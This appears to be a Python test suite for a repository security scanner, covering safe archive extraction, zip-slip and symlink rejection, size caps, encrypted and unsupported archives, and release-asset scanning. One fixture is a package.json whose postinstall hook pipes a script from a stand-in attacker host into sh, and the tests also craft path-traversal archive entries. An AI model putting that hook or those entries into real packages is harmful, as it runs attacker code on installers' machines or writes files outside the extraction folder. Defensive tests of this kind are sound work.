"""Safe archive scanning: zip/tar targets, zip-slip, symlinks, caps, encrypted/unsupported, release assets."""
import http.server
import io
import json
import os
import subprocess
import sys
import tarfile
import tempfile
import threading
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
import repobeagle as rb

FLAGS = ["--no-docker", "--no-osv", "--no-trust", "--no-cache", "--no-color"]
POSTINSTALL = json.dumps({"name": "x", "version": "1.0.0",
                          "scripts": {"postinstall": "curl -fsSL https://evil.example.invalid/x.sh | sh"}})


def scan(target, *extra, env=None):
    cache = tempfile.mkdtemp()
    e = dict(os.environ, XDG_CACHE_HOME=cache, **(env or {}))
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as fh:
        out = Path(fh.name)
    try:
        r = subprocess.run([sys.executable, "repobeagle.py", "scan", str(target), *FLAGS, *extra,
                            "--json", str(out)], cwd=ROOT, capture_output=True, text=True, timeout=600, env=e)
        doc = json.loads(out.read_text(encoding="utf-8")) if out.stat().st_size else None
        return doc, r
    finally:
        out.unlink(missing_ok=True)


def zipfile_with(path, files, extra=None):
    with zipfile.ZipFile(path, "w") as z:
        for name, data in files.items():
            z.writestr(name, data)
        if extra:
            extra(z)
    return path


def test_zip_slip_and_symlinks():
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        src = zipfile_with(td / "slip.zip", {"good.txt": "ok\n", "dir/inner.txt": "ok\n"}, extra=lambda z: None)
        with zipfile.ZipFile(src, "a") as z:
            z.writestr("../escape.txt", "escaped\n")
            z.writestr("/absolute.txt", "absolute\n")
            link = zipfile.ZipInfo("link.txt")
            link.external_attr = (0o120777 << 16)
            z.writestr(link, "good.txt")
        dest = td / "out"
        summary = rb.safe_extract(src, dest)
        assert (dest / "good.txt").read_text() == "ok\n"
        assert (dest / "dir" / "inner.txt").read_text() == "ok\n"
        assert not (td / "escape.txt").exists(), "zip-slip wrote outside dest"
        assert not (td / "absolute.txt").exists()
        assert not (dest / "link.txt").exists(), "symlink was created"
        reasons = {s["name"]: s["reason"] for s in summary["skipped"]}
        assert reasons["../escape.txt"].startswith("absolute or '..'"), reasons
        assert reasons["/absolute.txt"].startswith("absolute or '..'"), reasons
        assert "symlink" in reasons["link.txt"], reasons
        assert summary["extracted"] == 2 and summary["entries"] == 5, summary
    print("PASS zip-slip/absolute members are rejected and symlink entries are recorded, not created")


def test_caps_encrypted_and_tar():
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        big = zipfile_with(td / "big.zip", {"big.txt": "x" * 4096, "small.txt": "ok"})
        orig_entry, orig_total = rb.ARCHIVE_MAX_ENTRY_BYTES, rb.ARCHIVE_MAX_TOTAL_BYTES
        try:
            rb.ARCHIVE_MAX_ENTRY_BYTES = 1024
            rb.ARCHIVE_MAX_TOTAL_BYTES = 10 * 1024 * 1024
            summary = rb.safe_extract(big, td / "big-out")
            assert summary["truncated"] is False
            assert not (td / "big-out" / "big.txt").exists(), "oversize entry must be skipped"
            assert (td / "big-out" / "small.txt").exists()
            assert any("larger than" in s["reason"] for s in summary["skipped"]), summary
        finally:
            rb.ARCHIVE_MAX_ENTRY_BYTES, rb.ARCHIVE_MAX_TOTAL_BYTES = orig_entry, orig_total

        enc = zipfile_with(td / "enc.zip", {"a.txt": "ok"})
        data = bytearray(enc.read_bytes())          # zipfile cannot write encrypted zips: set the flag
        i = data.find(b"PK\x01\x02")               # central-directory general-purpose flags at +8
        assert i >= 0
        data[i + 8] |= 0x1
        enc.write_bytes(bytes(data))
        summary = rb.safe_extract(enc, td / "enc-out")
        assert summary["encrypted"] is True and summary["extracted"] == 0, summary

        tar = td / "bundle.tar.gz"
        with tarfile.open(tar, "w:gz") as tf:
            data = b"ok\n"
            ti = tarfile.TarInfo("readme.txt"); ti.size = len(data); tf.addfile(ti, io.BytesIO(data))
            link = tarfile.TarInfo("link"); link.type = tarfile.SYMTYPE; link.linkname = "readme.txt"
            tf.addfile(link)
        summary = rb.safe_extract(tar, td / "tar-out")
        assert (td / "tar-out" / "readme.txt").read_text() == "ok\n"
        assert not (td / "tar-out" / "link").exists()
        assert any("symlink" in s["reason"] for s in summary["skipped"]), summary
    print("PASS entry caps skip without truncating, encrypted zip detected, tar links recorded")


def test_archive_target_scan():
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        zip_target = zipfile_with(td / "bundle.zip", {
            "package.json": POSTINSTALL,
            "src/app.js": "console.log('hi')\n",
        })
        doc, r = scan(zip_target)
        assert doc is not None and doc["meta"]["archive"]["extracted"] == 2, doc and doc["meta"].get("archive")
        rules = {f["rule"] for f in doc["findings"]}
        assert "Download-and-execute" in rules or any("postinstall" in f["title"] for f in doc["findings"]), rules
        assert doc["verdict"] == "RED", doc["verdict"]
        assert not any(f["title"].startswith("Archive in repo") for f in doc["findings"]), "own archive wrongly flagged"

        tar_target = td / "bundle.tar.gz"
        with tarfile.open(tar_target, "w:gz") as tf:
            wf = b"name: ci\non: push\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n"
            ti = tarfile.TarInfo(".github/workflows/ci.yml"); ti.size = len(wf); tf.addfile(ti, io.BytesIO(wf))
        doc, r = scan(tar_target)
        assert doc and doc["meta"]["archive"]["extracted"] == 1, doc and doc["meta"].get("archive")
        assert any(f["rule"] == "gha-unpinned-action" for f in doc["findings"]), [f["rule"] for f in doc["findings"]]
    print("PASS archive targets are extracted under limits and scanned (zip + tar.gz)")


def test_unsupported_archive_target():
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        seven = td / "bundle.7z"
        seven.write_bytes(b"7z\xbc\xaf\x27\x1c" + b"\0" * 64)
        doc, _ = scan(seven)
        assert doc and doc["meta"]["archive"]["format"] is None, doc and doc["meta"].get("archive")
        assert any("contents not scanned" in f["title"] for f in doc["findings"]), [f["title"] for f in doc["findings"]]
    print("PASS unsupported archives stay flagged as uninspectable")


def test_release_assets():
    zip_bytes = io.BytesIO()
    with zipfile.ZipFile(zip_bytes, "w") as z:
        z.writestr("package.json", POSTINSTALL)
    payload = zip_bytes.getvalue()
    state = {"api": 0, "dl": 0}

    class H(http.server.BaseHTTPRequestHandler):
        def _send(self, code, body, ctype="application/json"):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            if self.path == "/repos/o/r/releases/latest":
                state["api"] += 1
                base = f"http://127.0.0.1:{srv.server_address[1]}"
                body = json.dumps({"tag_name": "v1.0.0", "assets": [
                    {"name": "bundle.zip", "size": len(payload), "browser_download_url": base + "/dl/bundle.zip"},
                    {"name": "notes.txt", "size": 3, "browser_download_url": base + "/dl/notes.txt"}]}).encode()
                return self._send(200, body)
            if self.path == "/dl/bundle.zip":
                state["dl"] += 1
                return self._send(200, payload, "application/zip")
            return self._send(404, b"{}")

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        base = f"http://127.0.0.1:{srv.server_address[1]}"
        doc, r = scan(ROOT / "tests/fixtures/control-clean", "--release-assets", "o/r",
                      env={"GITHUB_API_URL": base})
        assert doc and state["api"] == 1 and state["dl"] == 1, (state, doc and doc["notes"])
        assets = doc["meta"].get("release_assets") or []
        assert assets and assets[0]["name"] == "bundle.zip" and assets[0]["findings"] >= 1, assets
        prefixed = [f for f in doc["findings"] if f["file"].startswith("release-assets/bundle.zip/")]
        assert prefixed, [f["file"] for f in doc["findings"]]
        assert doc["verdict"] == "RED", doc["verdict"]
        doc2, _ = scan(ROOT / "tests/fixtures/control-clean", "--release-assets", "o/r",
                       env={"GITHUB_API_URL": base, "BEAGLE_ASSET_MAX_BYTES": "10"})
        assert doc2["meta"]["release_assets"][0].get("note"), doc2["meta"]["release_assets"]
        doc3, _ = scan(ROOT / "tests/fixtures/control-clean", "--release-assets", "o/r",
                       env={"GITHUB_API_URL": "http://127.0.0.1:1/none"})
        assert any("release-assets: skipped" in n for n in doc3["notes"]), doc3["notes"]
    finally:
        srv.shutdown(); srv.server_close()
    print("PASS latest release assets are downloaded, extracted and scanned (limits and failure degrade to notes)")


if __name__ == "__main__":
    test_zip_slip_and_symlinks()
    test_caps_encrypted_and_tar()
    test_archive_target_scan()
    test_unsupported_archive_target()
    test_release_assets()
    print("archive tests passed")
